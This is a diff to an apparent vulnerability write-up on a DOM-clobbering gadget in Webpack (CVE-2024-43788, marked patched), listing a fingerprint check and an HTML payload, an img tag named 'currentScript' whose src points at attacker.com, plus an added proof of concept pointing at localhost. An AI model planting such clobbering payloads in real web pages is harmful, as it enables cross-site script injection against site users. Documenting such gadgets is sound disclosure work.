@@ -6,7 +6,7 @@
 + Stars: 64.4K
 + Version: v5.93.0
 + Fingerprint: `typeof __webpack_require__ !== 'undefined' && __webpack_require__.hasOwnProperty('p')`
-+ Payload: ```<img name="currentScript" src="https://xxx.xxx.xxx"></img>```
++ Payload: ```<img name="currentScript" src="https://attacker.com"></img>```
 + Impact: XSS
 + Status: Patched
 + CVE: CVE-2024-43788
@@ -111,7 +111,7 @@ __webpack_require__.l = (url, done, key, chunkId) => {
 };
 ```
 
-## PoC
+## More Details 
 
 ```
 <html>
@@ -144,3 +144,15 @@ module.exports = {
 
 Webpack's generated code differes significantly for each use. Ensure that the code snippets appear, then browse the network requests to see the URLs that are requested. Some users may configure their public path differently. Fingerprint may not work if Webpack is configured to not produce source maps.
 
+
+## PoC
+
+```
+<!--Library-->
+<script src="./dist/webpack-gadgets.bundle.js"></script>
+<!--Library-->
+
+<!--Payload-->
+<img name="currentScript" src="http://localhost:9999"></img>
+<!--Payload-->
+```
